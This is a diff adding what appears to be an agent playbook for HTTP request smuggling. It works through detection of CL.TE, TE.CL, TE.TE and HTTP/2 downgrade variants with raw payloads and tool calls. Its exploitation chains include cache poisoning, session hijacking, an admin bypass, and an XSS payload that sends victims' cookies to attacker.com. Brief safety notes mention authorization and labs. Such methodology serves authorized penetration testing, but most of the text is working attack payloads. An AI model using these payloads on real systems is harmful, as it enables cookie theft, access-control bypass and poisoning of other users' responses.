@@ -1,0 +1,186 @@
+=== HTTP Request Smuggling ===
+
+Exploits discrepancies in how front-end and back-end servers parse HTTP requests.
+Enables cache poisoning, request hijacking, and security control bypass.
+
+--- VARIANTS ---
+
+  Variant   Front-End Uses       Back-End Uses        Complexity
+  -------   --------------       -------------        ----------
+  CL.TE     Content-Length       Transfer-Encoding    Medium
+  TE.CL     Transfer-Encoding   Content-Length        Medium
+  TE.TE     Transfer-Encoding   Transfer-Encoding*   Medium
+  H2.CL     HTTP/2              Content-Length**      High
+  H2.TE     HTTP/2              Transfer-Encoding**   High
+
+  * One server ignores obfuscated TE header
+  ** After HTTP/2->HTTP/1.1 downgrade
+
+  IMPORTANT: Use send_http1_request_raw or send_raw_tls for smuggling.
+  Standard tools normalize headers, breaking the attack.
+
+--- PHASE 1: ARCHITECTURE DETECTION ---
+
+  Identify proxy layers: CDN, WAF, load balancer, reverse proxy.
+
+  send_http1_request(
+    content="GET / HTTP/1.1\nHost: target.com\n\n",
+    targetHostname="target.com", targetPort=443, usesHttps=true
+  )
+  -> Check for: Via, X-Cache, X-Served-By, X-Amz-Cf-Id, CF-Ray headers
+
+  Test HTTP/2 support:
+    send_http2_request(...) -> if successful, may downgrade to H/1.1 internally
+
+--- PHASE 2: CL.TE DETECTION ---
+
+  Front-end uses Content-Length, back-end uses Transfer-Encoding.
+
+  Timing test (base64 encode and use send_http1_request_raw):
+    POST / HTTP/1.1
+    Host: TARGET
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    1
+    A
+    X
+
+  If response takes ~10 seconds -> CL.TE likely vulnerable.
+  Back-end waits for chunk terminator that never comes.
+
+  Confirmation -- smuggle a partial request:
+    POST / HTTP/1.1
+    Host: TARGET
+    Content-Length: 35
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /404-confirm HTTP/1.1
+    X-Ignore:
+
+  Follow up with normal GET. If you get 404 -> smuggling confirmed.
+
+--- PHASE 3: TE.CL DETECTION ---
+
+  Front-end uses Transfer-Encoding, back-end uses Content-Length.
+
+  Timing test:
+    POST / HTTP/1.1
+    Host: TARGET
+    Content-Length: 6
+    Transfer-Encoding: chunked
+
+    3
+    abc
+    X
+
+  If front-end hangs waiting for "0\r\n\r\n" -> TE.CL likely vulnerable.
+
+  Confirmation:
+    POST / HTTP/1.1
+    Host: TARGET
+    Content-Length: 4
+    Transfer-Encoding: chunked
+
+    12
+    GPOST /404 HTTP/1.1
+
+    0
+
+
+  Follow up with normal GET. If "GPOST" method error or 404 -> confirmed.
+
+--- PHASE 4: TE.TE OBFUSCATION ---
+
+  Both servers support TE, but obfuscation causes one to ignore it:
+
+    Transfer-Encoding : chunked         (space before colon)
+    Transfer-Encoding:chunked           (no space after colon)
+    Transfer-Encoding: xchunked         (invalid value)
+    Transfer-encoding: chunked          (lowercase)
+    Transfer-Encoding: chunked
+    Transfer-Encoding: x               (duplicate with invalid)
+    Transfer-Encoding:\tchunked         (tab before value)
+    Transfer-Encoding: "chunked"        (quoted)
+    Transfer-Encoding: chunked, cow     (multiple values)
+
+  Test each variant with CL.TE or TE.CL confirmation payloads.
+
+--- PHASE 5: HTTP/2 DOWNGRADE SMUGGLING ---
+
+  H2.CL -- HTTP/2 front-end, Content-Length mismatch after downgrade:
+    send_http2_request(
+      pseudoHeaders={"method": "POST", "path": "/", "scheme": "https", "authority": "target.com"},
+      headers={"content-type": "application/x-www-form-urlencoded"},
+      requestBody="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
+      targetHostname="target.com", targetPort=443, usesHttps=true
+    )
+
+  H2.TE -- Inject Transfer-Encoding via HTTP/2 (normally prohibited):
+    send_http2_request(... headers={"transfer-encoding": "chunked"} ...)
+
+  CRLF injection in H2 headers:
+    send_http2_request_raw with rawHeaders containing CRLF in values:
+    -> Header value: "bar\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com"
+
+--- PHASE 6: COLLABORATOR CONFIRMATION ---
+
+  Definitive proof via out-of-band:
+
+  collaborator_generate_payload(customData="smuggle")
+  -> payload = abc123.oastify.com
+
+  CL.TE with Collaborator host:
+    POST / HTTP/1.1
+    Host: TARGET
+    Content-Length: 150
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /x HTTP/1.1
+    Host: abc123.oastify.com
+
+
+  collaborator_poll_interactions(clientId=ID)
+  -> If DNS/HTTP interaction received -> smuggling CONFIRMED
+
+--- EXPLOITATION CHAINS ---
+
+  1. Cache Poisoning:
+     Smuggle request with X-Forwarded-Host: attacker.com targeting cacheable resource.
+     Other users get poisoned cached response.
+
+  2. Session Hijacking:
+     Smuggle POST to storage endpoint (comments, profile).
+     Next user's request headers (including cookies) appended to stored content.
+
+  3. Access Control Bypass:
+     Smuggle GET /admin with X-Forwarded-For: 127.0.0.1.
+     Bypasses IP-based access control on front-end.
+
+  4. Reflected XSS Upgrade:
+     Smuggle GET /search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>
+     Next user's request triggers XSS.
+
+--- SAFETY NOTES ---
+
+  Smuggling affects other users in shared environments:
+  - Lab environments: safe to test fully
+  - Production: extreme caution -- smuggled requests processed as real user requests
+  - Use timing-based detection before exploitation
+  - Confirm testing authorized for infrastructure-level vulnerabilities
+
+--- TESTING CHECKLIST ---
+
+  [ ] Identify architecture (CDN, load balancer, proxy layers)
+  [ ] Test CL.TE timing differential
+  [ ] Test TE.CL timing differential
+  [ ] Try TE.TE obfuscation variants
+  [ ] Confirm with Collaborator
+  [ ] Test HTTP/2 downgrade scenarios
+  [ ] Check cache poisoning potential
+  [ ] Test access control bypass via smuggling
+  [ ] Document all successful techniques
